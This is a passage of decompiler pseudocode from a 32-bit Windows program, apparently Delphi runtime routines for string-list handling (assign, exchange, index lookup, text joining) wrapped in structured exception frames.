// 42B940: using guessed type int **off_42B940[3];

//----- (00419104) --------------------------------------------------------
_DWORD *__usercall sub_419104@<eax>(int *a1@<eax>, int *a2@<edx>)
{
  return sub_419034(a2, a1);
}

//----- (00419110) --------------------------------------------------------
_DWORD *__usercall sub_419110@<eax>(int *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax
  int *v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-11Ch] BYREF
  int *v8; // [esp-4h] [ebp-114h]
  char v9[256]; // [esp+Ch] [ebp-104h] BYREF
  int v10; // [esp+10Ch] [ebp-4h] BYREF
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  v10 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4191A5;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_403484(*a1, v9);
  sub_4044C8(a2, v9);
  sub_403714(a1, -1);
  if ( v4 )
  {
    sub_403714(a1, -1);
    sub_403714(v5, -2);
    if ( v10 )
      sub_4045E4((volatile __int32 *)a2, 3);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4191AC;
  return sub_40426C(&v10);
}
// 41915A: variable 'v4' is possibly undefined
// 41916E: variable 'v5' is possibly undefined

//----- (004191C4) --------------------------------------------------------
void __usercall sub_4191C4(int *a1@<eax>)
{
  int v2; // eax
  int *v3; // eax
  _DWORD *v4; // eax
  int *v5; // [esp-4h] [ebp-Ch]

  nullsub_9();
  sub_403714(a1, -1);
  if ( v2 )
  {
    sub_403714(a1, -1);
    v5 = v3;
    v4 = sub_405F40(a1 + 1);
    sub_4035E8(v5, dword_419204, v4);
  }
}
// 4191DC: variable 'v2' is possibly undefined
// 4191E9: variable 'v3' is possibly undefined
// 403754: using guessed type int nullsub_9(void);
// 419204: using guessed type int dword_419204[2];

//----- (00419254) --------------------------------------------------------
int __stdcall sub_419254(int *a1, _DWORD *a2, _DWORD *a3)
{
  if ( (unsigned __int8)sub_4035E8(a1, a2, a3) )
    return 0;
  else
    return -2147467262;
}

//----- (0041927C) --------------------------------------------------------
unsigned __int8 __usercall sub_41927C@<al>(int a1@<eax>, _DWORD *a2@<edx>)
{
  unsigned __int8 result; // al
  int v5; // eax
  _DWORD *v6; // eax

  if ( a2 )
    *a2 = 0;
  result = (unsigned __int8)sub_405F40(a2);
  if ( a1 )
  {
    sub_403714((int *)a1, -1);
    if ( v5 )
    {
      result = sub_4036C0((int *)a1, (int)off_418058);
      if ( !result || (*(_BYTE *)(a1 + 28) & 0x10) != 0 )
      {
        sub_405F40(a2);
        return sub_41927C();
      }
    }
    else
    {
      result = sub_4036C0((int *)a1, (int)off_418058);
      if ( result )
      {
        if ( (*(_BYTE *)(a1 + 28) & 0x10) != 0 )
        {
          v6 = sub_405F40(a2);
          return (*(int (__stdcall **)(int, int *, _DWORD *))(*(_DWORD *)a1 + 40))(a1, dword_419304, v6);
        }
      }
    }
  }
  return result;
}
// 4192A8: variable 'v5' is possibly undefined
// 418058: using guessed type int (*off_418058[7])();
// 419304: using guessed type int dword_419304[4];

//----- (00419314) --------------------------------------------------------
_DWORD *__usercall sub_419314@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _DWORD *v6; // eax
  unsigned int v8[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v9; // [esp-10h] [ebp-14h]
  int v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_419369;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v6 = sub_405F40(&v10);
  sub_41927C(a1, v6);
  if ( v10 )
    (*(void (__fastcall **)(int, int))(*(_DWORD *)v10 + 16))(a3, a2);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_419370;
  return sub_405F40(&v10);
}

//----- (00419378) --------------------------------------------------------
_DWORD *__usercall sub_419378@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  int *v2; // eax
  int v3; // ecx
  char v4; // dl
  char v5; // bl
  int v6; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v5 = v4;
  v6 = (int)v2;
  v2[3] = 1;
  if ( v2[2] )
    sub_41947C(v2);
  LOBYTE(v3) = 1;
  sub_419314(v6, v6, v3);
  sub_403534(*(_DWORD **)(v6 + 8));
  result = sub_418FF4((_DWORD *)v6, v5 & 0xFC);
  if ( v5 > 0 )
    return (_DWORD *)sub_4038B4((_DWORD *)v6);
  return result;
}
// 41937F: variable 'v4' is possibly undefined
// 41939D: variable 'v3' is possibly undefined

//----- (004193C4) --------------------------------------------------------
int __usercall sub_4193C4@<eax>(int a1@<eax>)
{
  return (*(int (__fastcall **)(int, char))(*(_DWORD *)(a1 + 4) + 28))(a1, 1);
}

//----- (004193D0) --------------------------------------------------------
_DWORD *__usercall sub_4193D0@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>)
{
  int v3; // eax
  int v4; // ebx
  int v5; // edi
  int v6; // eax
  unsigned int v8[2]; // [esp-8h] [ebp-18h] BYREF
  int *v9; // [esp+0h] [ebp-10h]
  int v10; // [esp+4h] [ebp-Ch]
  int v11; // [esp+8h] [ebp-8h]
  int *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v12 = a1;
  if ( !sub_4036C0((int *)a2, (int)off_417884) )
    return sub_419020(v12, a2);
  (*(void (__stdcall **)(int *))(*v12 + 32))(v9);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_41944E;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_41947C(v12);
  v3 = sub_419520((int)a2);
  if ( v3 - 1 >= 0 )
  {
    v4 = v3;
    v5 = 0;
    do
    {
      sub_419528((int)a2, v5);
      v6 = sub_4193C4((int)v12);
      (*(void (**)(void))(*(_DWORD *)v6 + 8))();
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  __writefsdword(0, v8[0]);
  return (_DWORD *)(*(int (__stdcall **)(void *, int, int, int *))(*v12 + 36))(&loc_41945F, v10, v11, v12);
}
// 417884: using guessed type int (*off_417884[10])();

//----- (00419468) --------------------------------------------------------
int __usercall sub_419468@<eax>(int result@<eax>)
{
  ++*(_DWORD *)(result + 12);
  return result;
}

//----- (0041946C) --------------------------------------------------------
_DWORD *__usercall sub_41946C@<eax>(_DWORD *result@<eax>)
{
  if ( !result[3] )
    return (_DWORD *)(*(int (**)(void))(*result + 28))();
  return result;
}

//----- (0041947C) --------------------------------------------------------
int __usercall sub_41947C@<eax>(int *a1@<eax>)
{
  int result; // eax
  _DWORD *v2; // eax
  unsigned int v3[2]; // [esp-8h] [ebp-10h] BYREF
  int *v4; // [esp+0h] [ebp-8h]
  int *v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  result = a1[2];
  if ( *(int *)(result + 8) > 0 )
  {
    (*(void (__stdcall **)(int *))(*v5 + 32))(v4);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_4194D6;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    while ( *(int *)(v5[2] + 8) > 0 )
    {
      v2 = (_DWORD *)sub_418CFC(v5[2]);
      sub_403534(v2);
    }
    __writefsdword(0, v3[0]);
    return (*(int (__stdcall **)(void *, int *))(*v5 + 36))(&loc_4194DD, v5);
  }
  return result;
}

//----- (004194E4) --------------------------------------------------------
_DWORD *__usercall sub_4194E4@<eax>(_DWORD *a1@<eax>)
{
  --a1[3];
  return sub_41946C(a1);
}

//----- (004194F4) --------------------------------------------------------
_DWORD *__thiscall sub_4194F4(_DWORD *this)
{
  return sub_40426C(this);
}

//----- (00419500) --------------------------------------------------------
int __userpurge sub_419500@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  int v3; // eax

  v3 = sub_419528(a1, a2);
  return (*(int (**)(void))(*(_DWORD *)v3 + 12))();
}

//----- (00419520) --------------------------------------------------------
int __usercall sub_419520@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(*(_DWORD *)(a1 + 8) + 8);
}

//----- (00419528) --------------------------------------------------------
int __usercall sub_419528@<eax>(int a1@<eax>, int a2@<edx>)
{
  return sub_418C80(*(_DWORD *)(a1 + 8), a2);
}

//----- (0041953C) --------------------------------------------------------
int __usercall sub_41953C@<eax>(int *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax
  int *v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-120h] BYREF
  int *v8; // [esp-4h] [ebp-118h]
  char v9[256]; // [esp+Ch] [ebp-108h] BYREF
  __int32 v10; // [esp+10Ch] [ebp-8h] BYREF
  int v11; // [esp+110h] [ebp-4h]
  int savedregs; // [esp+114h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4195EA;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_403484(*a1, v9);
  sub_4044C8(a2, v9);
  sub_403714(a1, -1);
  if ( v4 )
  {
    sub_403714(a1, -1);
    sub_403714(v5, -2);
    if ( v11 )
    {
      sub_419604(a1, &v10);
      if ( v10 )
        sub_4045E4((volatile __int32 *)a2, 3);
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4195F1;
  return sub_404290((int)&v10, 2);
}
// 419589: variable 'v4' is possibly undefined
// 41959D: variable 'v5' is possibly undefined

//----- (00419604) --------------------------------------------------------
volatile __int32 *__usercall sub_419604@<eax>(int *a1@<eax>, volatile __int32 *a2@<edx>)
{
  int *v2; // eax
  volatile __int32 *result; // eax
  int v4; // eax
  volatile __int32 *v5; // ebx
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // esi
  int *v10; // eax
  unsigned int v11[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v12; // [esp-4h] [ebp-20h]
  int *v13; // [esp+Ch] [ebp-10h]
  void *v14; // [esp+10h] [ebp-Ch]
  volatile __int32 *v15; // [esp+14h] [ebp-8h]
  int *v16; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v15 = a2;
  v16 = a1;
  sub_4042C0(a2, a1[5]);
  sub_403714(v16, -1);
  v13 = v2;
  result = v15;
  if ( !*v15 )
  {
    if ( v13 )
    {
      result = (volatile __int32 *)sub_403740(*v13);
      if ( result )
      {
        v4 = sub_403740(*v13);
        result = (volatile __int32 *)sub_4163BC(v4);
        v5 = result;
        if ( result )
        {
          if ( *((_WORD *)result + 4) )
          {
            v14 = (void *)sub_4026E0(4 * *((__int16 *)result + 4));
            v12 = &savedregs;
            v11[1] = (unsigned int)&loc_419701;
            v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
            __writefsdword(0, (unsigned int)v11);
            v6 = sub_403740(*v13);
            sub_4165DC(v6, v14);
            if ( *((__int16 *)v5 + 4) - 1 >= 0 )
            {
              v7 = *((__int16 *)v5 + 4);
              v8 = 0;
              do
              {
                v9 = *((_DWORD *)v14 + v8);
                if ( ***(_BYTE ***)v9 == 7 )
                {
                  LOBYTE(v10) = sub_416660(v13, *((_DWORD *)v14 + v8));
                  if ( v10 == v16 )
                    sub_4044C8((char **)v16 + 5, (char *)(v9 + 26));
                }
                ++v8;
                --v7;
              }
              while ( v7 );
            }
            __writefsdword(0, v11[0]);
            v12 = (int *)&loc_419708;
            sub_402700((int)v14);
            return sub_4042C0(v15, v16[5]);
          }
        }
      }
    }
  }
  return result;
}
// 41962D: variable 'v2' is possibly undefined
// 4196D7: variable 'v10' is possibly undefined

//----- (00419730) --------------------------------------------------------
int __usercall sub_419730@<eax>(int result@<eax>, char a2@<cl>)
{
  bool v2; // cf
  char v3; // cl

  v2 = a2 == 0;
  v3 = a2 - 1;
  if ( v2 )
    return (*(int (**)(void))(*(_DWORD *)result + 12))();
  if ( v3 == 1 )
    return (*(int (**)(void))(*(_DWORD *)result + 16))();
  return result;
}

//----- (00419754) --------------------------------------------------------
_DWORD *__usercall sub_419754@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_41A294((int)v2, 0);
  result = sub_418FF4(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 41975B: variable 'v3' is possibly undefined

//----- (00419784) --------------------------------------------------------
int __usercall sub_419784@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // esi

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 20))();
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 96))(a2, v4);
  return v4;
}

//----- (004197A8) --------------------------------------------------------
int __usercall sub_4197A8@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v4; // ebx

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 56))();
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a2, v4);
  return v4;
}

//----- (004197CC) --------------------------------------------------------
_DWORD *__usercall sub_4197CC@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  _DWORD v7[3]; // [esp-18h] [ebp-30h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  void *v11; // [esp+0h] [ebp-18h]
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  int v13; // [esp+10h] [ebp-8h]
  _DWORD *v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a2;
  v14 = a1;
  v10 = &savedregs;
  v9 = &loc_419873;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_419914(a1);
  v7[2] = &savedregs;
  v7[1] = &loc_419856;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v2 = (*(int (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 20))(
         v7[0],
         &loc_419856,
         &savedregs,
         ExceptionList);
  if ( v2 - 1 >= 0 )
  {
    v3 = v2;
    v4 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v13 + 12))(&v12, v4);
      v5 = (*(int (__cdecl **)(int))(*(_DWORD *)v13 + 24))(v12);
      (*(void (__thiscall **)(int))(*v14 + 60))(v5);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41985D;
  sub_4199D0(v14);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41987A;
  return sub_40426C(&v12);
}

//----- (00419884) --------------------------------------------------------
_DWORD *__usercall sub_419884@<eax>(int *a1@<eax>, int a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v5; // [esp-8h] [ebp-14h]
  int *v6; // [esp-4h] [ebp-10h]
  void *v7; // [esp+0h] [ebp-Ch]
  int *v8; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v8 = a1;
  if ( !sub_4036C0((int *)a2, (int)off_417990) )
    return sub_419020(v8, (int (***)(void))a2);
  sub_419914(v8);
  v6 = &savedregs;
  v5 = &loc_4198FB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*v8 + 68))(ExceptionList);
  *((_BYTE *)v8 + 4) = *(_BYTE *)(a2 + 4);
  *((_BYTE *)v8 + 6) = *(_BYTE *)(a2 + 6);
  *((_BYTE *)v8 + 5) = *(_BYTE *)(a2 + 5);
  (*(void (**)(void))(*v8 + 64))();
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_41990C;
  return sub_4199D0(v8);
}
// 417990: using guessed type int (*off_417990[3])();

//----- (00419914) --------------------------------------------------------
_DWORD *__usercall sub_419914@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( !result[2] )
    result = (_DWORD *)(*(int (**)(void))(*result + 48))();
  ++v1[2];
  return result;
}

//----- (0041992C) --------------------------------------------------------
int __usercall sub_41992C@<eax>(int a1@<ebx>, int a2)
{
  int v2; // esi
  int v3; // eax

  v2 = *(_DWORD *)(*(_DWORD *)(a2 - 4) + 32);
  if ( v2 )
  {
    LOBYTE(a1) = 1;
    if ( sub_4036C0(*(int **)(*(_DWORD *)(a2 - 4) + 32), (int)off_417990) )
    {
      LOBYTE(v3) = sub_4199E4(*(_DWORD *)(a2 - 8), v2);
      a1 = v3;
      LOBYTE(a1) = v3 ^ 1;
    }
  }
  else
  {
    LOBYTE(a1) = (*(int (**)(void))(**(_DWORD **)(a2 - 8) + 20))() > 0;
  }
  return a1;
}
// 419964: variable 'v3' is possibly undefined
// 417990: using guessed type int (*off_417990[3])();

//----- (00419984) --------------------------------------------------------
int __usercall sub_419984@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v3; // eax
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v3 = sub_41992C(a3, (int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, _DWORD *(__usercall *)@<eax>(int@<eax>, _DWORD *@<edx>), int, _DWORD *(__usercall *)@<eax>(_DWORD *@<eax>, _DWORD *@<edx>), int))(*(_DWORD *)a2 + 4))(
           v3,
           "Strings",
           sub_41A3DC,
           a1,
           sub_41A12C,
           a1);
}

//----- (004199D0) --------------------------------------------------------
_DWORD *__usercall sub_4199D0@<eax>(_DWORD *result@<eax>)
{
  if ( !--result[2] )
    return (_DWORD *)(*(int (**)(void))(*result + 48))();
  return result;
}

//----- (004199E4) --------------------------------------------------------
char __usercall sub_4199E4@<al>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  int v3; // esi
  int v4; // ebx
  char v5; // zf
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v8; // [esp-8h] [ebp-28h]
  int *v9; // [esp-4h] [ebp-24h]
  void *v10; // [esp+0h] [ebp-20h]
  int *v11; // [esp+Ch] [ebp-14h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v12; // [esp+10h] [ebp-10h] BYREF
  char v13; // [esp+17h] [ebp-9h]
  int v14; // [esp+18h] [ebp-8h]
  int v15; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v14 = a2;
  v15 = a1;
  v9 = &savedregs;
  v8 = &loc_419A79;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v13 = 0;
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList);
  if ( v2 == (*(int (**)(void))(*(_DWORD *)v14 + 20))() )
  {
    if ( v2 - 1 < 0 )
    {
LABEL_6:
      v13 = 1;
    }
    else
    {
      v3 = v2;
      v4 = 0;
      while ( 1 )
      {
        (*(void (__fastcall **)(struct _EXCEPTION_REGISTRATION_RECORD **, int))(*(_DWORD *)v15 + 12))(&v12, v4);
        ExceptionList = v12;
        (*(void (__fastcall **)(int **, int))(*(_DWORD *)v14 + 12))(&v11, v4);
        Delphi_CompareCall_404668((int)ExceptionList, v11);
        if ( !v5 )
          break;
        ++v4;
        if ( !--v3 )
          goto LABEL_6;
      }
    }
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_419A80;
  sub_404290((int)&v11, 2);
  return v13;
}
// 419A54: variable 'v5' is possibly undefined
// 4199E4: using guessed type struct _EXCEPTION_REGISTRATION_RECORD *var_10;

//----- (00419A8C) --------------------------------------------------------
int __usercall sub_419A8C@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (00419A90) --------------------------------------------------------
int __usercall sub_419A90@<eax>(
        int a1@<edx>,
        int a2@<ecx>,
        int a3@<ebx>,
        int a4@<ebp>,
        int a5@<esi>,
        int a6,
        int a7,
        int a8,
        int a9)
{
  int v11; // eax
  int v13; // [esp+0h] [ebp-10h] BYREF
  char v14; // [esp+4h] [ebp-Ch]
  int v15; // [esp+8h] [ebp-8h]
  int v16; // [esp+Ch] [ebp-4h]

  v16 = a3;
  v15 = a5;
  sub_419A8C(a4);
  v13 = a2;
  v14 = 0;
  v11 = sub_4095A4((int)dword_4174AC, 1, a1, 0, (int)&v13);
  return sub_403CCC(v11, a6, a7, a8, a9);
}
// 4174AC: using guessed type int dword_4174AC[5];

//----- (00419AC8) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__usercall sub_419AC8@<eax>(int a1@<eax>, int **a2@<edx>, int a3@<ecx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-1Ch] BYREF
  void *v8; // [esp-14h] [ebp-18h]
  void **v9; // [esp-10h] [ebp-14h]
  int v10; // [esp-Ch] [ebp-10h]
  unsigned int v11; // [esp-4h] [ebp-8h]
  char *v12; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v12 = 0;
  v9 = &savedregs;
  v8 = &loc_419B10;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4063D4(a2, &v12);
  sub_419A90((int)v12, a3, a1, (int)&savedregs, (int)a2, (int)ExceptionList, (int)v8, (int)v9, v10);
  __writefsdword(0, v11);
  savedregs = &loc_419B17;
  return sub_40426C(&v12);
}
// 419B0A: bad sp value at call

//----- (00419B20) --------------------------------------------------------
int __usercall sub_419B20@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // eax
  _DWORD v7[3]; // [esp-18h] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v9; // [esp-8h] [ebp-24h]
  int *v10; // [esp-4h] [ebp-20h]
  void *v11; // [esp+0h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-10h] BYREF
  int v13; // [esp+10h] [ebp-Ch] BYREF
  int v14; // [esp+14h] [ebp-8h]
  _DWORD *v15; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v15 = a1;
  v10 = &savedregs;
  v9 = &loc_419BF8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_419914(a1);
  v7[2] = &savedregs;
  v7[1] = &loc_419BD6;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  (*(void (__fastcall **)(int *, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v15 + 12))(
    &v13,
    a2,
    v7[0],
    &loc_419BD6,
    &savedregs,
    ExceptionList);
  v14 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int *, int))(*v15 + 12))(&v12, a3);
  (*(void (__fastcall **)(int, int))(*v15 + 32))(v12, a2);
  v5 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int, int))(*v15 + 36))(v5, a2);
  (*(void (__fastcall **)(int, int))(*v15 + 32))(v13, a3);
  (*(void (__fastcall **)(int, int))(*v15 + 36))(v14, a3);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_419BDD;
  sub_4199D0(v15);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_419BFF;
  return sub_404290((int)&v12, 2);
}

//----- (00419C08) --------------------------------------------------------
int __usercall sub_419C08@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 20))();
}

//----- (00419C10) --------------------------------------------------------
int sub_419C10()
{
  return 0;
}

//----- (00419C14) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char *__usercall sub_419C14@<eax>(int a1@<eax>)
{
  char *v1; // eax
  char *v2; // ebx
  _DWORD v4[4]; // [esp-10h] [ebp-14h] BYREF
  char *v5; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[2] = &savedregs;
  v4[1] = &loc_419C59;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  (*(void (__stdcall **)(_DWORD, void *, void **))(*(_DWORD *)a1 + 28))(v4[0], &loc_419C59, &savedregs);
  v1 = sub_40471C(v5);
  v2 = sub_408260(v1);
  __writefsdword(0, v4[3]);
  savedregs = &loc_419C60;
  sub_40426C(&v5);
  return v2;
}
// 419C53: bad sp value at call

//----- (00419C68) --------------------------------------------------------
int __usercall sub_419C68@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v2; // ebx
  int v3; // esi
  int v4; // edi
  int v5; // esi
  int v6; // ebx
  int v7; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-38h] BYREF
  void *v10; // [esp-8h] [ebp-34h]
  int *v11; // [esp-4h] [ebp-30h]
  void *v12; // [esp+0h] [ebp-2Ch]
  int v13; // [esp+Ch] [ebp-20h] BYREF
  char *v14; // [esp+10h] [ebp-1Ch] BYREF
  char *v15; // [esp+14h] [ebp-18h] BYREF
  char *v16; // [esp+18h] [ebp-14h]
  int v17; // [esp+1Ch] [ebp-10h]
  int v18; // [esp+20h] [ebp-Ch]
  char **v19; // [esp+24h] [ebp-8h]
  int v20; // [esp+28h] [ebp-4h]
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v13 = 0;
  v15 = 0;
  v14 = 0;
  v19 = a2;
  v20 = a1;
  v11 = &savedregs;
  v10 = &loc_419D73;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v17 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList);
  v2 = 0;
  sub_404304((volatile __int32 *)&v14, (__int32)&dword_419D8C);
  if ( v17 - 1 >= 0 )
  {
    v3 = v17;
    v18 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v20 + 12))(&v13, v18);
      v4 = sub_404524(v13);
      v2 += sub_404524((int)v14) + v4;
      ++v18;
      --v3;
    }
    while ( v3 );
  }
  sub_40435C(v19, 0, v2);
  v16 = *v19;
  if ( v17 - 1 >= 0 )
  {
    v5 = v17;
    v18 = 0;
    do
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)v20 + 12))(&v15, v18);
      v6 = sub_404524((int)v15);
      if ( v6 )
      {
        sub_402844(v15, v16, v6);
        v16 += v6;
      }
      v7 = sub_404524((int)v14);
      if ( v7 )
      {
        sub_402844(v14, v16, v7);
        v16 += v7;
      }
      ++v18;
      --v5;
    }
    while ( v5 );
  }
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_419D7A;
  return sub_404290((int)&v13, 3);
}
// 419D8C: using guessed type int dword_419D8C;

//----- (00419D90) --------------------------------------------------------
int __usercall sub_419D90@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v7; // [esp-8h] [ebp-20h]
  int *v8; // [esp-4h] [ebp-1Ch]
  void *v9; // [esp+0h] [ebp-18h]
  int v10; // [esp+Ch] [ebp-Ch] BYREF
  int v11; // [esp+10h] [ebp-8h]
  int v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v12 = a2;
  v8 = &savedregs;
  v7 = &loc_419E08;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(ExceptionList);
  if ( v3 - 1 < 0 )
  {
LABEL_5:
    v11 = -1;
  }
  else
  {
    v4 = v3;
    v11 = 0;
    while ( 1 )
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)a1 + 12))(&v10, v11);
      if ( !(*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 52))(v12, v10) )
        break;
      ++v11;
      if ( !--v4 )
        goto LABEL_5;
    }
  }
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_419E0F;
  sub_40426C(&v10);
  return v11;
}

//----- (00419E1C) --------------------------------------------------------
int __usercall sub_419E1C@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v7; // [esp-8h] [ebp-24h]
